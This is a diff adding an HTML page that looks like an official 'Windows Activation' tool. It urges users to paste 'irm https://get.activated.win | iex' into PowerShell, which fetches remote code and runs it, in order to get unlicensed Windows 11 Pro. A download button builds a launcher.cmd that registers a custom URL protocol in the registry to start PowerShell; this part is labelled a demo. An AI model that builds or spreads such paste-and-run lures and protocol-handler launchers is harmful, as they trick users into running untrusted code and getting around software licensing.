@@ -1,0 +1,372 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light">
+  <title>Windows Activation</title>
+  <style>
+    :root { color-scheme: light; font-family: "Segoe UI",system-ui,-apple-system,sans-serif; background:#f5f7fc; color:#15223a; }
+    *{box-sizing:border-box}
+    html,body{min-height:100%;margin:0}
+    body{background:linear-gradient(170deg,#f8faff 0%,#f0f5fc 100%);}
+    .shell{width:min(100% - 40px,900px);margin:auto;padding:12px 0 76px}
+    .mark{background:#145fcc;color:#fff;border-radius:12px;width:39px;height:39px;display:grid;place-items:center;flex-shrink:0}
+    .window-logo{display:grid;grid-template-columns:repeat(2,8px);grid-template-rows:repeat(2,8px);gap:3px;transform:skewY(-4deg)}
+    .window-logo i{width:8px;height:8px;background:#fff;display:block}
+    .page-title{display:flex;align-items:center;gap:14px}
+    .page-title .mark{width:51px;height:51px;border-radius:13px}
+    .page-title .window-logo{grid-template-columns:repeat(2,11px);grid-template-rows:repeat(2,11px);gap:3px}
+    .page-title .window-logo i{width:11px;height:11px}
+    .download-btn{font-size:14px;min-height:40px;padding:9px 14px}
+    .download-btn svg{width:17px;height:17px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}
+    main{margin-top:0}
+    h1{font-size:clamp(33px,5vw,47px);line-height:1.12;letter-spacing:-.05em;margin:0 0 13px}
+    p{line-height:1.58;color:#607088;margin:0}
+    .intro{max-width:760px;font-size:16px}
+    .intro > p:first-child{color:#475a73}
+    .intro .method-label{font-weight:700;color:#263c59;margin-top:14px}
+    .intro ul{margin:8px 0 0;padding-left:22px;color:#607088;line-height:1.65}
+    .intro li{padding-left:2px;margin:3px 0}
+    .intro li strong{color:#334a68}
+    .grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:22px;margin:32px 0 26px}
+    .card{background:#fff;border:1px solid #dce5f3;border-radius:17px;padding:32px 30px 34px;box-shadow:0 9px 32px rgba(22,50,102,.045);display:flex;flex-direction:column;min-width:0}
+    .eyebrow{color:#1b63c1;font-size:12px;font-weight:800;letter-spacing:.08em;text-transform:uppercase;margin-bottom:16px}
+    h2{font-size:22px;letter-spacing:-.03em;margin:0 0 14px}
+    .card > p{font-size:14px;line-height:1.65}
+    ol{margin:18px 0 23px;padding-left:21px;line-height:1.82;color:#3a4b62;flex:1}
+    li{padding-left:2px}
+
+    /* Keyboard keycaps illustrate shortcuts without simulating operating-system input. */
+    .steps{list-style:none;counter-reset:instruction;display:flex;flex-direction:column;justify-content:space-between;gap:20px;flex:1;margin:26px 0 0;padding:0;line-height:1.55}
+    .steps li{position:relative;counter-increment:instruction;flex-shrink:0;margin:0;padding:0 0 0 31px;min-height:24px}
+    .steps li::before{content:counter(instruction);position:absolute;left:0;top:1px;width:21px;height:21px;display:grid;place-items:center;border-radius:50%;background:#edf3ff;border:1px solid #d2e1fa;font-size:11px;font-weight:800;color:#245b9c}
+    /* Align the Option 2 first step number with the Download CMD button. */
+    .card[aria-labelledby="optionTwo"] .steps li:first-child::before{top:50%;transform:translateY(-50%)}
+    .instruction-text{font-size:14px;color:#3a4b62}
+    .action-visual{display:flex;align-items:center;gap:5px;margin-top:6px;min-height:28px;color:#306cc2}
+    .keyset{display:inline-flex;align-items:center;flex-wrap:wrap;gap:5px}
+    kbd.keycap{display:inline-flex;align-items:center;justify-content:center;gap:4px;min-width:30px;min-height:29px;padding:4px 8px;border:1px solid #cbd5e3;border-bottom:3px solid #acbed5;border-radius:6px;background:linear-gradient(#fff,#f4f6fa);box-shadow:0 1px 0 rgba(35,53,85,.05);font:700 12px/1.1 "Segoe UI",system-ui,sans-serif;color:#253e5d;white-space:nowrap}
+    .windows-symbol{display:inline-grid;grid-template-columns:repeat(2,5px);grid-template-rows:repeat(2,5px);gap:2px;transform:skewY(-4deg)}
+    .windows-symbol i{display:block;background:#2970c8;width:5px;height:5px}
+    .key-join{font-size:13px;font-weight:750;color:#8290a3;padding:0 2px}
+    .type-token{display:inline-flex;align-items:center;min-height:29px;padding:4px 9px;font:600 12px/1.2 Consolas,monospace;border:1px solid #cbdcf2;border-radius:6px;color:#214c82;background:#edf4ff;white-space:nowrap}
+    .command-token{white-space:normal;overflow-wrap:anywhere;min-width:0;line-height:1.45}
+    .steps code{overflow-wrap:anywhere}
+    .then{font-size:12px;font-weight:600;color:#697f99;padding:0 4px}
+    .command-input{display:block;max-width:100%;width:100%;margin-top:8px;min-height:35px;padding:7px 9px;font:600 12px/1.3 Consolas,monospace;color:#214c82;background:#edf4ff;border:1px solid #cbdcf2;border-radius:6px}
+    .or-text{font-size:12px;color:#627791;font-weight:600;margin:0 3px}
+    .btn-content{display:inline-flex;align-items:center;gap:8px}
+    .inline-keyset{display:inline-flex;align-items:center;gap:4px;vertical-align:middle;margin:0 2px}
+    .inline-keyset .keycap, kbd.enter-key{min-height:23px;min-width:25px;padding:3px 5px;font-size:11px;vertical-align:middle}
+    .inline-keyset .keycap:first-child, kbd.enter-key{width:54px;height:23px}
+    @media (prefers-reduced-motion:no-preference){button,.button{transition:background .15s ease}}
+
+    code,textarea{font-family:Consolas,"SFMono-Regular",monospace}
+    code{font-size:.92em;background:#eff3fa;padding:2px 4px;border-radius:4px}
+    button,.button{appearance:none;border:0;text-decoration:none;font:inherit;font-size:15px;font-weight:750;cursor:pointer;border-radius:11px;display:inline-flex;justify-content:center;align-items:center;min-height:48px;padding:12px 19px;text-align:center;gap:8px}
+    /* Unified, fully clickable copy/download controls with an attached lighter icon panel. */
+    button.action-pill{
+      display:inline-flex;align-items:stretch;vertical-align:middle;
+      max-width:100%;min-height:36px;height:auto;padding:0;margin:2px 1px;
+      border:1px solid #cbdcf2;border-radius:7px;overflow:hidden;
+      background:#edf4ff;color:#214c82;box-shadow:none;
+      font:600 12px/1.35 Consolas,"SFMono-Regular",monospace;
+      text-align:left;white-space:normal;
+    }
+    button.action-pill:hover{background:#e4efff;border-color:#a8c9f3}
+    button.action-pill:focus-visible{outline:3px solid #88b4ff;outline-offset:3px}
+    .action-pill .action-label{display:flex;align-items:center;min-width:0;padding:7px 10px;overflow-wrap:anywhere}
+    .action-pill .action-icon{
+      flex:0 0 35px;width:35px;display:flex;align-items:center;justify-content:center;
+      border-left:1px solid #d4e2f4;background:#f8fbff;color:#7595bb;
+    }
+    .action-pill:hover .action-icon{background:#f1f7ff;color:#3d73ae}
+    .action-pill .action-icon svg{width:16px;height:16px;fill:none;stroke:currentColor;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}
+    .action-pill .check-icon{display:none}
+    .action-pill.copied{border-color:#add8bd;background:#ebf9f0;color:#166e43}
+    .action-pill.copied .action-icon{border-left-color:#c9e6d2;background:#f4fcf7;color:#298056}
+    .action-pill.copied .copy-icon{display:none}
+    .action-pill.copied .check-icon{display:block}
+    .action-pill.download-action{font:750 13px/1.35 "Segoe UI",system-ui,sans-serif;color:#155ab8}
+
+    /* Preserve the original compact blue tokens while making the whole text box clickable. */
+    button.copy-action.type-token{
+      display:inline-flex;align-items:center;justify-content:center;vertical-align:middle;
+      min-height:29px;height:auto;margin:0;padding:4px 9px;
+      border:1px solid #cbdcf2;border-radius:6px;background:#edf4ff;color:#214c82;
+      font:600 12px/1.2 Consolas,monospace;text-align:left;white-space:nowrap;box-shadow:none;
+      cursor:pointer;position:relative;
+    }
+    /* Fixed, mobile-visible feedback: does not shift or resize any instructions. */
+    .copy-toast{
+      position:fixed;left:50%;top:calc(15px + env(safe-area-inset-top, 0px));
+      transform:translate(-50%, 10px);z-index:1000;max-width:calc(100vw - 32px);
+      padding:9px 14px;border:1px solid #b9e3c7;border-radius:9px;
+      background:#effaf3;color:#216a45;
+      font:700 13px/1.35 "Segoe UI",system-ui,sans-serif;
+      text-align:center;white-space:normal;box-shadow:0 5px 18px rgba(22,50,102,.12);
+      opacity:0;visibility:hidden;pointer-events:none;
+    }
+    .copy-toast.visible{opacity:1;visibility:visible;transform:translate(-50%, 0)}
+    .copy-toast.error{border-color:#ead8ba;background:#fff8e9;color:#755421}
+    @media (prefers-reduced-motion:no-preference){.copy-toast{transition:opacity .15s ease,transform .15s ease,visibility .15s ease}}
+    button.copy-action.command-token{white-space:normal;overflow-wrap:anywhere;min-width:0;line-height:1.45}
+    button.copy-action:hover{background:#e6efff;border-color:#afc9eb}
+    button.copy-action.copied{background:#ebf9f0;border-color:#add8bd;color:#166e43}
+    button.copy-action:focus-visible{outline:3px solid #88b4ff;outline-offset:3px}
+    /* Local feedback is shown beside the tapped text, including on small iPhones. */
+    button.copy-action.copied::after{
+      content:"✓ Copied";position:absolute;top:calc(100% + 5px);left:0;
+      z-index:5;padding:3px 7px;border:1px solid #b9e3c7;
+      border-radius:5px;background:#effaf3;color:#216a45;
+      font:700 11px/1.3 "Segoe UI",system-ui,sans-serif;
+      white-space:nowrap;box-shadow:0 3px 9px rgba(22,50,102,.08);
+    }
+    .manual-copy-backdrop[hidden]{display:none!important}
+    .manual-copy-backdrop{
+      position:fixed;inset:0;z-index:2000;display:flex;align-items:center;
+      justify-content:center;padding:20px;background:rgba(21,34,58,.5);
+    }
+    .manual-copy-dialog{
+      position:relative;background:white;border-radius:15px;border:1px solid #cbdcf2;
+      box-shadow:0 18px 48px rgba(21,34,58,.20);padding:24px;
+      width:min(100%,420px);color:#15223a;
+    }
+    .manual-copy-dialog h3{font-size:19px;line-height:1.3;margin:0 30px 9px 0}
+    .manual-copy-dialog p{font-size:14px;line-height:1.55}
+    .manual-copy-dialog textarea{
+      display:block;width:100%;height:85px;min-height:65px;margin-top:14px;
+      font:16px/1.5 Consolas,monospace;resize:none;
+      -webkit-user-select:text;user-select:text;-webkit-touch-callout:default;
+      background:#edf4ff;color:#214c82;
+    }
+    .manual-copy-close{
+      position:absolute;right:13px;top:12px;min-height:32px;min-width:32px;
+      padding:5px;border-radius:8px;background:#edf4ff;color:#325980;
+      font-size:21px;line-height:1;
+    }
+    .sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
+    .primary{background:#1466d1;color:#fff;box-shadow:0 5px 12px rgba(20,102,209,.15)}
+    .primary:hover{background:#0d55b3}
+    .secondary{color:#155ab8;border:1px solid #cbdcf8;background:#edf4ff}
+    .secondary:hover{background:#dfecff}
+    button:focus-visible,a:focus-visible,summary:focus-visible,textarea:focus-visible{outline:3px solid #88b4ff;outline-offset:3px}
+    .card .button,.card button{align-self:flex-start}
+    .status{font-size:13px!important;color:#155ab8!important}
+    .status:empty{display:none}
+    .status:not(:empty){margin-top:14px!important;line-height:1.45}
+    .complete{display:flex;align-items:center;justify-content:space-between;gap:20px;border:1px solid #d7e3f6;border-radius:15px;background:#eaf2ff;padding:22px 24px}
+    .complete strong{display:block;font-size:16px;margin-bottom:6px}
+    .complete p{font-size:13px}
+    details{margin-top:24px;font-size:13px;color:#5e6b81}
+    summary{cursor:pointer;font-weight:700;color:#4b5a72}
+    textarea{width:100%;height:124px;margin-top:12px;border:1px solid #bdcce1;border-radius:9px;padding:12px;font-size:12px;resize:vertical;line-height:1.5;color:#33405b}
+    .security{font-size:12px;margin-top:16px}
+    @media(max-width:670px){
+      .shell{width:min(100% - 28px,900px);padding-top:12px}
+      main{margin-top:0}
+      .grid{grid-template-columns:1fr;gap:18px;margin-top:28px}
+      .card{padding:27px 25px 29px}
+      .steps{flex-grow:0;gap:20px;margin-top:24px}
+      .complete{align-items:stretch;flex-direction:column}
+      .complete .button{width:100%}
+    }
+    @media(max-width:360px){
+      .complete .button{font-size:13px;padding:10px 9px;gap:6px}
+    }
+  </style>
+</head>
+<body>
+  <div class="shell">
+    <main id="setupView">
+      <h1 class="page-title"><span class="mark" aria-hidden="true"><span class="window-logo"><i></i><i></i><i></i><i></i></span></span><span>Windows Activation</span></h1>
+      <div class="intro">
+        <p>This tool is designed to activate Windows 11 and upgrade your system to Windows 11 Pro.</p>
+        <p class="method-label">Choose your preferred method:</p>
+        <ul>
+          <li><strong>PowerShell:</strong> Run the command manually for direct installation.</li>
+          <li><strong>CMD Launcher:</strong> Use a lightweight CMD launcher for a quicker, easier, and more convenient setup.</li>
+        </ul>
+      </div>
+      <div class="grid">
+        <section class="card" aria-labelledby="optionOne">
+          <div class="eyebrow">Option 1 · No download</div>
+          <h2 id="optionOne">Use PowerShell</h2>
+          <p>Use your keyboard to open PowerShell and run the command below.</p>
+          <ol class="steps">
+            <li><div class="instruction-text">Press <span class="inline-keyset" role="img" aria-label="Windows key plus R"><kbd class="keycap" aria-hidden="true"><span class="windows-symbol"><i></i><i></i><i></i><i></i></span>Win</kbd><span class="key-join" aria-hidden="true">+</span><kbd class="keycap" aria-hidden="true">R</kbd></span></div></li>
+            <li><div class="instruction-text">Type <button aria-label="Copy PowerShell" class="type-token copy-action" data-copy="powershell" title="Click to copy PowerShell" type="button">powershell</button> and press <kbd class="keycap enter-key" aria-label="Enter">↵ Enter</kbd></div></li>
+            <li><div class="instruction-text">Type the command <button aria-label="Copy command" class="type-token command-token copy-action" data-copy="command" title="Click to copy command" type="button">irm https://get.activated.win | iex</button></div></li>
+            <li><div class="instruction-text">Press <kbd class="keycap enter-key" aria-label="Enter">↵ Enter</kbd> and PowerShell will start running the command.</div></li>
+          </ol>
+        </section>
+        <section class="card" aria-labelledby="optionTwo">
+          <div class="eyebrow">Option 2 · Download</div>
+          <h2 id="optionTwo">Download CMD</h2>
+          <p>Download and launch the CMD file to run the included PowerShell setup.</p>
+          <ol class="steps">
+            <li><div class="instruction-text"><button id="downloadLauncher" class="action-pill download-action" type="button"><span class="action-label">Download CMD</span><span class="action-icon" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M12 3v12m-5-5 5 5 5-5M4 17v4h16v-4"/></svg></span></button></div></li>
+            <li><div class="instruction-text">Launch it.</div></li>
+            <li><div class="instruction-text">Click <strong>Confirm</strong> on the popup.</div></li>
+            <li><div class="instruction-text">PowerShell command will run automatically.</div></li>
+          </ol>
+          <p class="status" id="downloadStatus" role="status" aria-live="polite"></p>
+        </section>
+      </div>
+      <section class="complete" aria-label="Download Windows 11">
+        <div><strong>Need the latest version of Windows?</strong><p>For a fresh installation or reinstall, use Microsoft’s official installation media first.</p></div>
+        <a class="button primary" href="https://www.microsoft.com/en-ca/software-download/windows11" target="_blank" rel="noopener noreferrer">Download Windows 11 ISO <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M7 17 17 7M8 7h9v9"/></svg></a>
+      </section>
+      <script type="text/plain" id="setupCommand">$ErrorActionPreference='Stop';$r='HKCU:\Software\Classes\windowskeydemo';$e=Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe';New-Item -Path ($r+'\shell\open\command') -Force | Out-Null;Set-Item -Path $r -Value 'URL:Windows Activation Demo';New-ItemProperty -Path $r -Name 'URL Protocol' -PropertyType String -Value '' -Force | Out-Null;Set-Item -Path ($r+'\shell\open\command') -Value (([char]34)+$e+([char]34)+' -NoLogo -NoProfile -NoExit -Command Get-Date');Get-Date;Write-Host 'Windows Activation demo setup complete.'</script>
+      <div id="copyFeedback" class="copy-toast" role="status" aria-live="polite" aria-atomic="true"></div>
+      <div id="manualCopy" class="manual-copy-backdrop" hidden>
+        <section class="manual-copy-dialog" role="dialog" aria-modal="true" aria-labelledby="manualCopyTitle">
+          <button id="manualCopyClose" class="manual-copy-close" type="button" aria-label="Close">×</button>
+          <h3 id="manualCopyTitle">Copy manually</h3>
+          <p>This browser blocked automatic copying. Touch and hold the text below, then choose <strong>Copy</strong>.</p>
+          <textarea id="manualCopyText" readonly spellcheck="false" aria-label="Text to copy"></textarea>
+        </section>
+      </div>
+      <noscript><p class="security">JavaScript is required to copy or download from this standalone page.</p></noscript>
+    </main>
+  </div>
+  <script>
+    'use strict';
+    const psSetup = document.getElementById('setupCommand').textContent.trim();
+
+    const copyFeedback = document.getElementById('copyFeedback');
+    const copyValues = {powershell: 'powershell', command: 'irm https://get.activated.win | iex'};
+
+    function showCopyFeedback(message, success) {
+      clearTimeout(showCopyFeedback.timer);
+      copyFeedback.textContent = message;
+      copyFeedback.classList.toggle('error', !success);
+      copyFeedback.classList.add('visible');
+      showCopyFeedback.timer = setTimeout(() => {
+        copyFeedback.classList.remove('visible');
+      }, 2200);
+    }
+
+    // Call every clipboard API directly in the tap/click handler. iOS Safari
+    // can reject attempts started after an await has consumed the user gesture.
+    function copyWithSelection(value) {
+      const temp = document.createElement('textarea');
+      temp.value = value;
+      temp.readOnly = true;
+      temp.setAttribute('aria-hidden', 'true');
+      temp.style.cssText = 'position:fixed;left:0;top:0;width:20px;height:20px;' +
+        'opacity:0.01;z-index:-1;font-size:16px;padding:0;border:0';
+      document.body.appendChild(temp);
+      let copied = false;
+      try {
+        temp.focus();
+        temp.select();
+        temp.setSelectionRange(0, value.length);
+        if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
+          const selection = window.getSelection();
+          const range = document.createRange();
+          range.selectNodeContents(temp);
+          selection.removeAllRanges();
+          selection.addRange(range);
+          temp.setSelectionRange(0, value.length);
+        }
+        copied = document.execCommand('copy');
+      } catch (error) {
+        copied = false;
+      } finally {
+        temp.remove();
+        // Don't focus another element or open the keyboard on mobile.
+        if (window.getSelection) window.getSelection().removeAllRanges();
+      }
+      return copied;
+    }
+
+    const manualCopy = document.getElementById('manualCopy');
+    const manualCopyText = document.getElementById('manualCopyText');
+    const manualCopyClose = document.getElementById('manualCopyClose');
+    manualCopyClose.addEventListener('click', () => { manualCopy.hidden = true; });
+    manualCopy.addEventListener('click', event => {
+      if (event.target === manualCopy) manualCopy.hidden = true;
+    });
+    manualCopyText.addEventListener('click', () => manualCopyText.select());
+
+    function presentManualCopy(value) {
+      manualCopyText.value = value;
+      showCopyFeedback('Copy blocked — select the text to copy', false);
+      manualCopy.hidden = false;
+    }
+
+    document.querySelectorAll('.copy-action').forEach(button => {
+      button.addEventListener('click', () => {
+        const kind = button.getAttribute('data-copy');
+        const value = copyValues[kind];
+        const label = kind === 'powershell' ? 'PowerShell' : 'command';
+        clearTimeout(button.copyResetTimer);
+        button.classList.remove('copied');
+        // Immediate visual feedback, even when the Clipboard API is slow.
+        showCopyFeedback('Copying…', true);
+
+        const succeeded = () => {
+          button.classList.add('copied');
+          button.title = 'Copied!';
+          button.setAttribute('aria-label', label + ' copied');
+          showCopyFeedback('✓ Copied to clipboard', true);
+          button.copyResetTimer = setTimeout(() => {
+            button.classList.remove('copied');
+            button.title = 'Copy ' + label;
+            button.setAttribute('aria-label', 'Copy ' + label);
+          }, 2400);
+        };
+        const failed = () => presentManualCopy(value);
+
+        // Start the secure-context API while the click still has activation.
+        let modernCopy = null;
+        if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function' && window.isSecureContext) {
+          try { modernCopy = navigator.clipboard.writeText(value); } catch (error) { /* Legacy fallback below. */ }
+        }
+        // Perform the legacy copy synchronously, not in an async catch block:
+        // this is particularly important for older iPhone Safari / file:// HTML.
+        const legacyCopied = copyWithSelection(value);
+        if (modernCopy) {
+          Promise.resolve(modernCopy).then(succeeded, () => {
+            if (legacyCopied) succeeded(); else failed();
+          });
+        } else if (legacyCopied) {
+          succeeded();
+        } else {
+          failed();
+        }
+      });
+    });
+
+    // Generate the CMD file in memory, so index.html also works as a standalone file.
+    document.getElementById('downloadLauncher').addEventListener('click', () => {
+      const cmdLines = [
+        '@echo off',
+        'setlocal',
+        'echo Windows Activation - demo setup',
+        'echo This registers a fixed demo PowerShell task for the current user.',
+        'powershell.exe -NoLogo -NoProfile -Command "' + psSetup + '"',
+        'if errorlevel 1 (',
+        '  echo Setup failed.',
+        '  pause',
+        '  exit /b 1',
+        ')',
+        'echo Setup complete.',
+        'pause'
+      ];
+      const blob = new Blob([cmdLines.join('\r\n') + '\r\n'], {type:'application/octet-stream'});
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'launcher.cmd';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      document.getElementById('downloadStatus').textContent = 'Downloaded. Open launcher.cmd manually when you are ready.';
+      setTimeout(() => URL.revokeObjectURL(url), 60000);
+    });
+  </script>
+</body>
+</html>
